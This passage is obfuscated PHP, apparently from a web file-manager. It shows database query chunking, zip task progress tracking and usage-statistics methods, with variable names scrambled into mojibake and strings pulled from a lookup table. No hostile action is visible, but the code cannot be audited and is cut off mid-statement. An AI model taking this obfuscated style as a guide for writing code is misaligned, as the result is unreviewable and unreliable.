$ìÄ¨«ò[$úî„©õ¦[354]][$³ùëßå¹][1] = $Ì¦ÓêØÈ; $this->optionsValue($ìÄ¨«ò); $Ç½—ú– += parent::save($Ô‰¹ï§İ, $ÕÖåÌµÈ); $this->chunkEventCheck(count($Ì¦ÓêØÈ)); } $this->chunkEventSet(); return $Ç½—ú–; } public function add($¯š€ã–‘ = '', $°Ì¬¤Œï = array(), $”ˆÕÇ€ = false) { if ($this->addTaskStatus && is_array($¯š€ã–‘)) { $this->addTaskData[] = $¯š€ã–‘; return; } return parent::add($¯š€ã–‘, $°Ì¬¤Œï, $”ˆÕÇ€); } public function parseWhereLike($«€ò¹Ÿ, $§Š­¹ı† = '', $÷ù±ØªÔ = false, &$Æ•Ô¢–Ä = false) { $ñ¥è£” =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿ£ÕÂ¸­ = $GLOBALS[$ñ¥è£”[6]][$ñ¥è£”[468]]; if (!$Ÿ£ÕÂ¸­[$ñ¥è£”[469]]) { return $«€ò¹Ÿ; } if (!is_array($«€ò¹Ÿ)) { return $«€ò¹Ÿ; } $ÂèÛ¨•Š = array(); $¬´”¥î½ = 0; foreach ($«€ò¹Ÿ as $µœ•†‡€ => $ïĞ÷Ú“) { if (is_array($ïĞ÷Ú“) && count($ïĞ÷Ú“) == 2 && $ïĞ÷Ú“[0] == $ñ¥è£”[470] && is_string($ïĞ÷Ú“[1]) && substr($ïĞ÷Ú“[1], 0, 1) == $ñ¥è£”[471] && substr($ïĞ÷Ú“[1], strlen($ïĞ÷Ú“[1]) - 1, 1) == $ñ¥è£”[471]) { $Æ•Ô¢–Ä = !0; $£ÚÉ’ğË = is_string($µœ•†‡€) ? $µœ•†‡€ : $§Š­¹ı†; $´£ôéÎ = substr($ïĞ÷Ú“[1], 1, strlen($ïĞ÷Ú“[1]) - 2); $´£ôéÎ = $this->db->escapeString($´£ôéÎ); if (!strpos($£ÚÉ’ğË, $ñ¥è£”[10])) { $£ÚÉ’ğË = $ñ¥è£”[472] . $£ÚÉ’ğË . $ñ¥è£”[472]; } $ÇîÌÒ‰Ï = $ñ¥è£”[221] . $´£ôéÎ . $ñ¥è£”[221]; $´£ôéÎ = str_replace(array($ñ¥è£”[10], $ñ¥è£”[473], $ñ¥è£”[11]), $ñ¥è£”[474], $´£ôéÎ); if ($Ÿ£ÕÂ¸­[$ñ¥è£”[475]]) { $ÇîÌÒ‰Ï = $ñ¥è£”[476] . $´£ôéÎ . $ñ¥è£”[477]; if ($Ÿ£ÕÂ¸­[$ñ¥è£”[478]]) { $ÇîÌÒ‰Ï = $ñ¥è£”[477] . $´£ôéÎ . $ñ¥è£”[476]; } } $ÂèÛ¨•Š[$¬´”¥î½] = $ñ¥è£”[479] . $£ÚÉ’ğË . $ñ¥è£”[480] . $ÇîÌÒ‰Ï . $ñ¥è£”[481]; $¬´”¥î½++; continue; } if (is_array($ïĞ÷Ú“)) { $§Š­¹ı† = is_string($µœ•†‡€) ? $µœ•†‡€ : $§Š­¹ı†; $ïĞ÷Ú“ = $this->parseWhereLike($ïĞ÷Ú“, $§Š­¹ı†, !0, $Æ•Ô¢–Ä); } if (is_numeric($µœ•†‡€)) { $ÂèÛ¨•Š[$¬´”¥î½] = $ïĞ÷Ú“; $¬´”¥î½++; } else { $ÂèÛ¨•Š[$µœ•†‡€] = $ïĞ÷Ú“; } } if ($Æ•Ô¢–Ä && !$÷ù±ØªÔ) { } return $ÂèÛ¨•Š; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÚØ§ãÏå = array()) { $µõÎ”ßĞ =& $_SERVER[¿ÈˆÑ¸ä]; $ œÊ£’ë = self::SQL_WHERE_IN_CHUNK; $¹¾¬«İÛ = $this->optionsValue(); $·æé£™ = $this->findWhereField($¹¾¬«İÛ); if (!$·æé£™ || isset($¹¾¬«İÛ[$µõÎ”ßĞ[369]]) || isset($¹¾¬«İÛ[$µõÎ”ßĞ[429]])) { return parent::select($ÚØ§ãÏå); } $¾ÀÍ¸µÎ = $¹¾¬«İÛ[$µõÎ”ßĞ[354]][$·æé£™][1]; $¾ÀÍ¸µÎ = is_array($¾ÀÍ¸µÎ) ? $¾ÀÍ¸µÎ : array(); $…¥¶‚Âº = null; for ($ğ¾‡• = 0; $ğ¾‡• < count($¾ÀÍ¸µÎ); $ğ¾‡• += $ œÊ£’ë) { $—Ø¾À«ƒ = array_slice($¾ÀÍ¸µÎ, $ğ¾‡•, $ œÊ£’ë); if (!is_array($—Ø¾À«ƒ) || count($—Ø¾À«ƒ) == 0) { break; } $¹¾¬«İÛ[$µõÎ”ßĞ[354]][$·æé£™][1] = $—Ø¾À«ƒ; $this->optionsValue($¹¾¬«İÛ); $¹ùœ½öì = parent::select($ÚØ§ãÏå); if (!$¹ùœ½öì) { continue; } $…¥¶‚Âº = is_array($…¥¶‚Âº) ? $…¥¶‚Âº : array(); $…¥¶‚Âº = array_merge($…¥¶‚Âº, $¹ùœ½öì); } return $…¥¶‚Âº; } public function delete($¼Â¥ÏŸ = array()) { $µ ÃÒğ =& $_SERVER[¿ÈˆÑ¸ä]; $†‰¹ÃˆË = self::SQL_WHERE_IN_CHUNK; $†ÏÚøî­ = $this->optionsValue(); $Ë‡ô•æı = $this->findWhereField($†ÏÚøî­); if (!$Ë‡ô•æı) { return parent::delete($¼Â¥ÏŸ); } $…†ğŸµ× = 0; $ÂÃ±Àº = $†ÏÚøî­[$µ ÃÒğ[354]][$Ë‡ô•æı][1]; $ÂÃ±Àº = is_array($ÂÃ±Àº) ? $ÂÃ±Àº : array(); for ($Å·ÚùµŞ = 0; $Å·ÚùµŞ < count($ÂÃ±Àº); $Å·ÚùµŞ += $†‰¹ÃˆË) { $ÊæÉìã¡ = array_slice($ÂÃ±Àº, $Å·ÚùµŞ, $†‰¹ÃˆË); if (!is_array($ÊæÉìã¡) || count($ÊæÉìã¡) == 0) { break; } $†ÏÚøî­[$µ ÃÒğ[354]][$Ë‡ô•æı][1] = $ÊæÉìã¡; $this->optionsValue($†ÏÚøî­); $…†ğŸµ× += parent::delete($¼Â¥ÏŸ); } return $…†ğŸµ×; } private function findWhereField($¶Å²Èé) { $Ô¦‰ÛüÜ =& $_SERVER[¿ÈˆÑ¸ä]; $ñ•üàô¸ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¶Å²Èé) || !is_array($¶Å²Èé[$Ô¦‰ÛüÜ[354]])) { return !1; } foreach ($¶Å²Èé[$Ô¦‰ÛüÜ[354]] as $›¨É©Ÿ” => $ÛÊš¿) { if (is_array($ÛÊš¿) && isset($ÛÊš¿[0]) && is_string($ÛÊš¿[0]) && strtolower($ÛÊš¿[0]) == $Ô¦‰ÛüÜ[7] && is_array($ÛÊš¿[1]) && count($ÛÊš¿[1]) > $ñ•üàô¸) { ignore_timeout(); return $›¨É©Ÿ”; } } return !1; } public function setMasterDB($ÖÙ…Œ¤ = true) { think_config($_SERVER[¿ÈˆÑ¸ä][482], $ÖÙ…Œ¤); } } goto F¸‡‡ªÙš¾; bÈ—ÜÒ©•: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Â—«Àşû =& $_SERVER[¿ÈˆÑ¸ä]; parent::startAfter(); Hook::bind($Â—«Àşû[2051], array($this, $Â—«Àşû[2041])); Hook::bind($Â—«Àşû[2043], array($this, $Â—«Àşû[2044])); $ê…´İœ =& $this->task; $ê…´İœ[$Â—«Àşû[2045]] = $Â—«Àşû[1318]; if (!$ê…´İœ[$Â—«Àşû[1802]]) { $ê…´İœ[$Â—«Àşû[1802]] = LNG($Â—«Àşû[2052]); } } protected function endAfter() { $ûêŞÇÂÉ =& $_SERVER[¿ÈˆÑ¸ä]; parent::endAfter(); Hook::unbind($ûêŞÇÂÉ[2051], array($this, $ûêŞÇÂÉ[2041])); Hook::unbind($ûêŞÇÂÉ[2043], array($this, $ûêŞÇÂÉ[2044])); } public function updateAfter() { $ñø´Áú =& $_SERVER[¿ÈˆÑ¸ä]; $š•Åƒ¶¯ =& $this->task; if (!$š•Åƒ¶¯[$ñø´Áú[1165]] || !$š•Åƒ¶¯[$ñø´Áú[847]]) { return; } if ($š•Åƒ¶¯[$ñø´Áú[2045]] == $ñø´Áú[1318]) { $¤¸â‘‰ = $š•Åƒ¶¯[$ñø´Áú[1970]]; if ($š•Åƒ¶¯[$ñø´Áú[1971]] != $ñø´Áú[1318]) { $¤¸â‘‰ = 0; } $¦›á’Î = ($š•Åƒ¶¯[$ñø´Áú[1974]] + $¤¸â‘‰) / $š•Åƒ¶¯[$ñø´Áú[847]]; $š•Åƒ¶¯[$ñø´Áú[1917]] = $¦›á’Î * 0.3; } else { if ($š•Åƒ¶¯[$ñø´Áú[2045]] == $ñø´Áú[389]) { $¦›á’Î = $š•Åƒ¶¯[$ñø´Áú[1916]] / $š•Åƒ¶¯[$ñø´Áú[1165]]; $š•Åƒ¶¯[$ñø´Áú[1917]] = 0.3 + $¦›á’Î * 0.5; } else { if ($š•Åƒ¶¯[$ñø´Áú[2045]] == $ñø´Áú[108]) { $¦›á’Î = 0; if ($š•Åƒ¶¯[$ñø´Áú[1969]]) { $¦›á’Î = $š•Åƒ¶¯[$ñø´Áú[1970]] / $š•Åƒ¶¯[$ñø´Áú[1969]]; } $š•Åƒ¶¯[$ñø´Áú[1917]] = 0.3 + 0.5 + $¦›á’Î * 0.2; } } } if ($š•Åƒ¶¯[$ñø´Áú[1917]] > 0) { $ìÔæİí« = timeFloat() - $š•Åƒ¶¯[$ñø´Áú[1919]] - $š•Åƒ¶¯[$ñø´Áú[1922]]; $š•Åƒ¶¯[$ñø´Áú[1923]] = $ìÔæİí« * (1 - $š•Åƒ¶¯[$ñø´Áú[1917]]) / $š•Åƒ¶¯[$ñø´Áú[1917]]; } } public function copyFileStart($î¶Ö·Ú±, $­ò½Œ¶ı, $Š¾†ªõ¨, $¤ë›—Õ‚, $©ı¶Öç•, $Æüø›ë) { $««¿ô—æ =& $_SERVER[¿ÈˆÑ¸ä]; parent::copyFileStart($î¶Ö·Ú±, $­ò½Œ¶ı, $Š¾†ªõ¨, $¤ë›—Õ‚, $©ı¶Öç•, $Æüø›ë); $•½å‚Ô =& $this->task; if ($•½å‚Ô[$««¿ô—æ[2045]] == $««¿ô—æ[389]) { $•½å‚Ô[$««¿ô—æ[2045]] = $««¿ô—æ[108]; } $this->update(); } public function copyFileEnd($Û‡Ÿû”¦, $©¼”§´Ü, $‘ø¦Ô¨“, $»¥Ãì÷, $ıú…†…, $ˆÑ‚à¯) { $Ÿ¡€‚Ş =& $_SERVER[¿ÈˆÑ¸ä]; $ç°À‰ğ… =& $this->task; $ç°À‰ğ…[$Ÿ¡€‚Ş[1970]] = $ç°À‰ğ…[$Ÿ¡€‚Ş[1969]]; $ç°À‰ğ…[$Ÿ¡€‚Ş[1974]] += $ç°À‰ğ…[$Ÿ¡€‚Ş[1969]]; $ç°À‰ğ…[$Ÿ¡€‚Ş[1971]] = $Ÿ¡€‚Ş[12]; $this->update(); } public function zipEvent($¢µğ›Õ, $‚ŞşêËø, $š¶ƒğÚí, $ÀîŞ¤ŠÃ) { $¤šÍº‡ =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÙçşÏ· =& $this->task; $ÎÙçşÏ·[$¤šÍº‡[1967]] = get_path_this($‚ŞşêËø); $ÎÙçşÏ·[$¤šÍº‡[1969]] = $ÀîŞ¤ŠÃ; $ÎÙçşÏ·[$¤šÍº‡[1970]] = $š¶ƒğÚí; $ÎÙçşÏ·[$¤šÍº‡[1167]] = $¢µğ›Õ == $¤šÍº‡[2053] ? $¤šÍº‡[2048] : $¤šÍº‡[2049]; $ÎÙçşÏ·[$¤šÍº‡[1971]] = $¤šÍº‡[12]; $ÎÙçşÏ·[$¤šÍº‡[847]] = $ÀîŞ¤ŠÃ; $ÎÙçşÏ·[$¤šÍº‡[2045]] = $¤šÍº‡[389]; $this->update(); } public function nameParse($Ë‘¬ÄÚ) { $‹”ÂÚ–„ =& $_SERVER[¿ÈˆÑ¸ä]; $Ì×†ı¦ú =& $this->task; if ($Ì×†ı¦ú[$‹”ÂÚ–„[1916]] < $Ì×†ı¦ú[$‹”ÂÚ–„[1165]]) { $â×Îä±Ñ = get_path_this($Ë‘¬ÄÚ); if (strstr($â×Îä±Ñ, $‹”ÂÚ–„[10])) { $Ì×†ı¦ú[$‹”ÂÚ–„[1916]] += 1; } } if ($Ì×†ı¦ú[$‹”ÂÚ–„[2045]] == $‹”ÂÚ–„[1318]) { $Ì×†ı¦ú[$‹”ÂÚ–„[2045]] = $‹”ÂÚ–„[389]; } $Ì×†ı¦ú[$‹”ÂÚ–„[1967]] = $Ë‘¬ÄÚ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ûªÄŒÔ´) { $œ½¤ Â =& $_SERVER[¿ÈˆÑ¸ä]; $èÓªÁã† = array($œ½¤ Â[681] => array($œ½¤ Â[33] => $œ½¤ Â[2054], $œ½¤ Â[352] => array($œ½¤ Â[283], $œ½¤ Â[849], $œ½¤ Â[2055], $œ½¤ Â[2056])), $œ½¤ Â[2057] => array($œ½¤ Â[33] => $œ½¤ Â[2058], $œ½¤ Â[352] => array($œ½¤ Â[283], $œ½¤ Â[847], $œ½¤ Â[2059], $œ½¤ Â[2060], $œ½¤ Â[2061]))); if (!isset($èÓªÁã†[$ûªÄŒÔ´])) { return !1; } $this->optionType = $èÓªÁã†[$ûªÄŒÔ´][$œ½¤ Â[33]]; $this->field = $èÓªÁã†[$ûªÄŒÔ´][$œ½¤ Â[352]]; return !0; } public function listData($á†Ã…ò¥ = false, $İ Úöú¨ = "\x6d\157\x64\x69\146\x79\x54\x69\155\x65", $’Ôà€ôÉ = false) { return parent::listData($á†Ã…ò¥, $İ Úöú¨, $’Ôà€ôÉ); } public function trendList($ö³ ÆçÊ) { $¬ñî ö =& $_SERVER[¿ÈˆÑ¸ä]; $ÓŒÍİ†› = $this->listData(); if ($ÓŒÍİ†›) { $ıüÏãÒ½ = end($ÓŒÍİ†›); $ˆÚ€Óçµ = date($¬ñî ö[2062], strtotime($¬ñî ö[2063])); if ($ıüÏãÒ½[$¬ñî ö[283]] == $ˆÚ€Óçµ) { return $ÓŒÍİ†›; } $î›÷½Î = strtotime($ıüÏãÒ½[$¬ñî ö[283]]); } if (!isset($î›÷½Î)) { $‚¶ˆœÓ¼ = $ö³ ÆçÊ == $¬ñî ö[681] ? $¬ñî ö[613] : $¬ñî ö[916]; $î›÷½Î = Model($‚¶ˆœÓ¼)->min($¬ñî ö[232]); } $÷ç’¦æ­ = $¬ñî ö[2064] . ucfirst($ö³ ÆçÊ); $­”„Åé‚ = $this->dateList($î›÷½Î); foreach ($­”„Åé‚ as $ˆÚ€Óçµ) { $this->{$÷ç’¦æ­}($ˆÚ€Óçµ); } return $this->listData(); } private function dateList($ÛÃÖğĞ) { $ñ³Ò‚ª =& $_SERVER[¿ÈˆÑ¸ä]; $Á°àˆ¢ = $ÛÃÖğĞ; $»Õá¿‘ë = strtotime($ñ³Ò‚ª[2063]); $É¦»–³ = array(); while ($Á°àˆ¢ <= $»Õá¿‘ë) { $É¦»–³[] = date($ñ³Ò‚ª[2062], $Á°àˆ¢); $Á°àˆ¢ = strtotime($ñ³Ò‚ª[2065], $Á°àˆ¢); } return $É¦»–³; } public function _recordUser($ßıÆçÓÅ = '') { $”ˆôÂÊç =& $_SERVER[¿ÈˆÑ¸ä]; $‡ƒ²Ò•¥ = strtotime(date($”ˆôÂÊç[2066], strtotime($ßıÆçÓÅ))); $¨Æ¯çÄ = strtotime(date($”ˆôÂÊç[2067], strtotime($ßıÆçÓÅ))); $Äş»çöä = array($”ˆôÂÊç[232] => array($”ˆôÂÊç[1116], $¨Æ¯çÄ)); $³íÓô®¾ = Model($”ˆôÂÊç[613])->where($Äş»çöä)->count($”ˆôÂÊç[1529]); $Äş»çöä[$”ˆôÂÊç[232]] = array($”ˆôÂÊç[409], array($‡ƒ²Ò•¥, $¨Æ¯çÄ)); $Ç‡”ñÙ = Model($”ˆôÂÊç[613])->where($Äş»çöä)->count($”ˆôÂÊç[1529]); $Äş»çöä[$”ˆôÂÊç[33]] = $”ˆôÂÊç[2068]; $ùÔÎè™‡ = Model($”ˆôÂÊç[2069])->where($Äş»çöä)->count($”ˆôÂÊç[2070]); $Ñ•åîáû = array($”ˆôÂÊç[283] => $ßıÆçÓÅ, $”ˆôÂÊç[849] => (int) $³íÓô®¾, $”ˆôÂÊç[2055] => (int) $Ç‡”ñÙ, $”ˆôÂÊç[2056] => (int) $ùÔÎè™‡); return $this->insert($Ñ•åîáû); } public function _recordStore($üìü÷º² = '') { $‹°à«¨ä =& $_SERVER[¿ÈˆÑ¸ä]; $ÛÌ³Èåú = strtotime(date($‹°à«¨ä[2067], strtotime($üìü÷º²))); $õùãèôã = array($‹°à«¨ä[232] => array($‹°à«¨ä[1116], $ÛÌ³Èåú)); $¹Î®‡±¯ = Model($‹°à«¨ä[556])->where($õùãèôã)->sum($‹°à«¨ä[79]); $õùãèôã[$‹°à«¨ä[496]] = 0; $Ğ²ı¯¤Ì = Model($‹°à«¨ä[916])->where($õùãèôã)->sum($‹°à«¨ä[79]); $õùãèôã[$‹°à«¨ä[189]] = 1; $ú˜ÕØïÓ = Model($‹°à«¨ä[916])->where($õùãèôã)->sum($‹°à«¨ä[79]); $õùãèôã[$‹°à«¨ä[189]] = 2; $ğ™ƒú = Model($‹°à«¨ä[916])->where($õùãèôã)->sum($‹°à«¨ä[79]); $óÔ¯ÑŞÅ = array($‹°à«¨ä[283] => $üìü÷º², $‹°à«¨ä[847] => (int) $Ğ²ı¯¤Ì, $‹°à«¨ä[2059] => (int) $¹Î®‡±¯, $‹°à«¨ä[2060] => (int) $ú˜ÕØïÓ, $‹°à«¨ä[2061] => (int) $ğ™ƒú); return $this->insert($óÔ¯ÑŞÅ); } public function trend($ğĞ„˜·˜, $š‚®öİÊ) { $Õ…ÜÎêò =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->init($ğĞ„˜·˜)) { return !1; } $–ÎÂ“¼ = $this->trendList($ğĞ„˜·˜); if ($–ÎÂ“¼ && $š‚®öİÊ != $Õ…ÜÎêò[1889]) { $¸”ÉÀí = $–ÎÂ“¼[0][$Õ…ÜÎêò[283]]; $ïçëæÅç = $this->validDate($š‚®öİÊ, $¸”ÉÀí); $°¨ÏÊä = array(); $Š¨‹ö = array_to_keyvalue($–ÎÂ“¼, $Õ…ÜÎêò[283]); foreach ($ïçëæÅç as $—ÙÜ ¨ä) { if (isset($Š¨‹ö[$—ÙÜ ¨ä])) { $ûÅÉ¬ÑÛ = $Š¨‹ö[$—ÙÜ ¨ä]; } else { $ûÅÉ¬ÑÛ = end($–ÎÂ“¼); $ûÅÉ¬ÑÛ[$Õ…ÜÎêò[283]] = $—ÙÜ ¨ä; if ($ğĞ„˜·˜ == $Õ…ÜÎêò[681]) { $ûÅÉ¬ÑÛ[$Õ…ÜÎêò[2055]] = $ûÅÉ¬ÑÛ[$Õ…ÜÎêò[2056]] = 0; } } $°¨ÏÊä[] = $ûÅÉ¬ÑÛ; } $–ÎÂ“¼ = $°¨ÏÊä; } $ô¦¨èŸ = array($Õ…ÜÎêò[681] => array($Õ…ÜÎêò[849] => LNG($Õ…ÜÎêò[2071]), $Õ…ÜÎêò[2055] => LNG($Õ…ÜÎêò[2072]), $Õ…ÜÎêò[2056] => LNG($Õ…ÜÎêò[2073])), $Õ…ÜÎêò[2057] => array($Õ…ÜÎêò[847] => LNG($Õ…ÜÎêò[2074]), $Õ…ÜÎêò[2059] => LNG($Õ…ÜÎêò[2075]), $Õ…ÜÎêò[2060] => LNG($Õ…ÜÎêò[2076]), $Õ…ÜÎêò[2061] => LNG($Õ…ÜÎêò[2077]))); $Õô¯Šª© = array($Õ…ÜÎêò[681] => $Õ…ÜÎêò[2078], $Õ…ÜÎêò[2057] => $Õ…ÜÎêò[79]); if (empty($–ÎÂ“¼)) { $—ÙÜ ¨ä = date($Õ…ÜÎêò[2062], strtotime($Õ…ÜÎêò[2063])); $ÓŒ§ÅöÒ = array($Õ…ÜÎêò[283] => $—ÙÜ ¨ä); foreach ($ô¦¨èŸ[$ğĞ„˜·˜] as $³ùÇ => $Ÿá¢Ğ×») { $ÓŒ§ÅöÒ[$³ùÇ] = 0; } $–ÎÂ“¼[] = $ÓŒ§ÅöÒ; } $åŠû´¾Ù = array(); foreach ($–ÎÂ“¼ as $Ÿá¢Ğ×») { if ($ğĞ„˜·˜ == $Õ…ÜÎêò[2057] && $Ÿá¢Ğ×»[$Õ…ÜÎêò[2059]] > $Ÿá¢Ğ×»[$Õ…ÜÎêò[847]]) { $Ÿá¢Ğ×»[$Õ…ÜÎêò[2059]] = $Ÿá¢Ğ×»[$Õ…ÜÎêò[847]]; } foreach ($ô¦¨èŸ[$ğĞ„˜·˜] as $³ùÇ => $Ä‚èê˜Ï) { $ûÅÉ¬ÑÛ = array($Õ…ÜÎêò[283] => $Ÿá¢Ğ×»[$Õ…ÜÎêò[283]], $Õ…ÜÎêò[1802] => $Ä‚èê˜Ï); $ûÅÉ¬ÑÛ[$Õô¯Šª©[$ğĞ„˜·˜]] = isset($Ÿá¢Ğ×»[$³ùÇ]) ? $Ÿá¢Ğ×»[$³ùÇ] : 0; $åŠû´¾Ù[] = $ûÅÉ¬ÑÛ; } } return $åŠû´¾Ù; } public function validDate($¹ğ›‹ë, $ùíğ œ¼) { $‘‘Ğ¡¥¹ =& $_SERVER[¿ÈˆÑ¸ä]; $¼É´ï¿Š = date($‘‘Ğ¡¥¹[2062], strtotime($‘‘Ğ¡¥¹[2063])); $¢øğËà = array($¼É´ï¿Š); switch ($¹ğ›‹ë) { case $‘‘Ğ¡¥¹[1896]: $õã±Ìó = mktime(0, 0, 0, date($‘‘Ğ¡¥¹[2079]), date($‘‘Ğ¡¥¹[1595]) - date($‘‘Ğ¡¥¹[1682]) + 7 - 7, date($‘‘Ğ¡¥¹[2080])); $ò›ÚóÆ = 0; do { $­ÒÂÛ = date($‘‘Ğ¡¥¹[2062], $õã±Ìó - 3600 * 24 * 7 * $ò›ÚóÆ); $¢øğËà[] = $­ÒÂÛ; $ò›ÚóÆ++; } while ($ùíğ œ¼ < $­ÒÂÛ); break; case $‘‘Ğ¡¥¹[1894]: $ò›ÚóÆ = 1; do { $ì°²ñÖ§ = date($‘‘Ğ¡¥¹[2081], strtotime("\x2d\x20{$ò›ÚóÆ}\x20\155\x6f\x6e\x74\x68\x73")); $¢øğËà[] = $ì°²ñÖ§; $ò›ÚóÆ++; } while ($ùíğ œ¼ < $ì°²ñÖ§); break; case $‘‘Ğ¡¥¹[2082]: $øŠÎèÈ = (int) date($‘‘Ğ¡¥¹[2080], strtotime($ùíğ œ¼)); $»™„ôßù = (int) date($‘‘Ğ¡¥¹[2080]); if ($øŠÎèÈ >= $»™„ôßù) { break; } for ($øŠÎèÈ; $øŠÎèÈ < $»™„ôßù; $øŠÎèÈ++) { $¢øğËà[] = $øŠÎèÈ . $‘‘Ğ¡¥¹[2083]; } break; default: break; } if ($ùíğ œ¼ > end($¢øğËà)) { array_pop($¢øğËà); } sort($¢øğËà); return $¢øğËà; } public function listTable($¬äÖ•ÆÊ) { $¶Í¡®¦Œ = ucfirst($¬äÖ•ÆÊ); return Model($¶Í¡®¦Œ)->listData(); } public function option($æé¢ŞÉ“) { return call_user_func_array(array($this, $_SERVER[¿ÈˆÑ¸ä][2084] . ucfirst($æé¢ŞÉ“)), array()); } private function optionUser() { $É“¾Ï¹– =& $_SERVER[¿ÈˆÑ¸ä]; $°šõ±˜ = Model($É“¾Ï¹–[613])->count($É“¾Ï¹–[1529]); $‹£ë²¸ = Model($É“¾Ï¹–[613])->where($É“¾Ï¹–[2085])->count($É“¾Ï¹–[1529]); $ŒÎ¾«±¶ = intval($GLOBALS[$É“¾Ï¹–[6]][$É“¾Ï¹–[425]][$É“¾Ï¹–[1862]]) / 3600; $î—†ëñ½ = strtotime("\x2d{$ŒÎ¾«±¶}\40\x68\x6f\x75\x72\x73"); $âÜÀ‰¤÷ = strtotime(date($É“¾Ï¹–[2066])); if ($î—†ëñ½ < $âÜÀ‰¤÷) { $î—†ëñ½ = $âÜÀ‰¤÷; } $Ÿ¹Šõ­ª = array($É“¾Ï¹–[2086] => array($É“¾Ï¹–[1117], $î—†ëñ½)); $¦˜š˜ªÄ = (int) Model($É“¾Ï¹–[613])->where($Ÿ¹Šõ­ª)->count($É“¾Ï¹–[1529]); if (!$¦˜š˜ªÄ) { $¦˜š˜ªÄ = 1; } $Ÿ¹Šõ­ª = array($É“¾Ï¹–[2086] => array($É“¾Ï¹–[1117], $âÜÀ‰¤÷)); $ËïÌ”è† = Model($É“¾Ï¹–[613])->where($Ÿ¹Šõ­ª)->count($É“¾Ï¹–[1529]); return array($É“¾Ï¹–[842] => (int) $°šõ±˜, $É“¾Ï¹–[2087] => (int) ($°šõ±˜ - $‹£ë²¸), $É“¾Ï¹–[2088] => (int) $‹£ë²¸, $É“¾Ï¹–[2089] => (int) $ËïÌ”è†, $É“¾Ï¹–[2090] => $¦˜š˜ªÄ); } private function optionFile() { $¶»¼†åÓ =& $_SERVER[¿ÈˆÑ¸ä]; $ôı®½š = $this->sourceSize(); $ §áº®š = $ôı®½š[$¶»¼†åÓ[79]]; $Ì§ùéî = $ôı®½š[$¶»¼†åÓ[2059]]; $é¿ ¤Š¨ = Model($¶»¼†åÓ[916])->where(array($¶»¼†åÓ[496] => 0))->count($¶»¼†åÓ[192]); $š™æ²š = array($¶»¼†åÓ[496] => 0, $¶»¼†åÓ[232] => array($¶»¼†åÓ[1117], strtotime(date($¶»¼†åÓ[2066])))); $üû¥š£€ = Model($¶»¼†åÓ[916])->where($š™æ²š)->sum($¶»¼†åÓ[79]); $ÜñãÜ²” = Model($¶»¼†åÓ[916])->where($š™æ²š)->count($¶»¼†åÓ[192]); return array($¶»¼†åÓ[847] => $ §áº®š, $¶»¼†åÓ[2059] => $Ì§ùéî, $¶»¼†åÓ[2091] => $ §áº®š - $Ì§ùéî, $¶»¼†åÓ[2092] => (int) $üû¥š£€, $¶»¼†åÓ[849] => (int) $é¿ ¤Š¨, $¶»¼†åÓ[2093] => (int) $ÜñãÜ²”); } private function optionAccess() { $¨òÅ†¥‰ =& $_SERVER[¿ÈˆÑ¸ä]; return array($¨òÅ†¥‰[842] => $this->typeLogCnt(), $¨òÅ†¥‰[108] => $this->typeLogCnt($¨òÅ†¥‰[108]), $¨òÅ†¥‰[535] => $this->typeLogCnt($¨òÅ†¥‰[535]), $¨òÅ†¥‰[1267] => $this->typeLogCnt($¨òÅ†¥‰[1267]), $¨òÅ†¥‰[1498] => $this->typeLogCnt($¨òÅ†¥‰[1498]), $¨òÅ†¥‰[681] => $this->typeLogCnt($¨òÅ†¥‰[12], $¨òÅ†¥‰[2070])); } private function typeLogCnt($¦úÏ‚û’ = '', $Ë—·Ô‘ = "\151\144") { $ÚÇÛŸô÷ =& $_SERVER[¿ÈˆÑ¸ä]; $ÒÔñ›½ = array($ÚÇÛŸô÷[108] => array($ÚÇÛŸô÷[2094], $ÚÇÛŸô÷[2095]), $ÚÇÛŸô÷[535] => array($ÚÇÛŸô÷[2096], $ÚÇÛŸô÷[2097]), $ÚÇÛŸô÷[1267] => array($ÚÇÛŸô÷[2098], $ÚÇÛŸô÷[2099], $ÚÇÛŸô÷[2100]), $ÚÇÛŸô÷[1498] => array($ÚÇÛŸô÷[2101], $ÚÇÛŸô÷[2102]), $ÚÇÛŸô÷[1499] => array($ÚÇÛŸô÷[2103], $ÚÇÛŸô÷[2104], $ÚÇÛŸô÷[2105])); $åˆ¹°¥œ = strtotime(date($ÚÇÛŸô÷[2066])); $“æéå = array($ÚÇÛŸô÷[232] => array($ÚÇÛŸô÷[1117], $åˆ¹°¥œ)); if ($¦úÏ‚û’) { $“æéå[$ÚÇÛŸô÷[33]] = array($ÚÇÛŸô÷[7], $ÒÔñ›½[$¦úÏ‚û’]); } $Í¤ûĞ§´ = Model($ÚÇÛŸô÷[2069])->where($“æéå)->count($Ë—·Ô‘); return (int) $Í¤ûĞ§´; } private function optionServer() { $ÒÄ”Š‡ª =& $_SERVER[¿ÈˆÑ¸ä]; $¨üçíÕ = $this->diskDriver(); $İõËÙ­« = KodIO::defaultDriver(); $×±è˜½ = array($ÒÄ”Š‡ª[909] => $İõËÙ­«[$ÒÄ”Š‡ª[483]]); $¥ƒ½„ò = Model($ÒÄ”Š‡ª[556])->where($×±è˜½)->sum($ÒÄ”Š‡ª[79]); $š Çäˆ = explode($ÒÄ”Š‡ª[53], $_SERVER[$ÒÄ”Š‡ª[145]]); $¸òï³ËŠ = $š Çäˆ[0]; $ô€êç× = $GLOBALS[$ÒÄ”Š‡ª[6]][$ÒÄ”Š‡ª[21]]; $Ù²“æÚÕ = $ô€êç×[$ÒÄ”Š‡ª[1079]]; if ($Ù²“æÚÕ == $ÒÄ”Š‡ª[1067]) { $•ú»£­Ú = explode($ÒÄ”Š‡ª[1409], $ô€êç×[$ÒÄ”Š‡ª[1078]]); $Ù²“æÚÕ = $•ú»£­Ú[0]; } if ($Ù²“æÚÕ == $ÒÄ”Š‡ª[1015] || $Ù²“æÚÕ == $ÒÄ”Š‡ª[887]) { $“¶€¶§» = Model()->db()->query($ÒÄ”Š‡ª[2106]); $Ü•¹±Îğ = $“¶€¶§»[0] && isset($“¶€¶§»[0][$ÒÄ”Š‡ª[1801]]) ? $“¶€¶§»[0][$ÒÄ”Š‡ª[1801]] : 0; 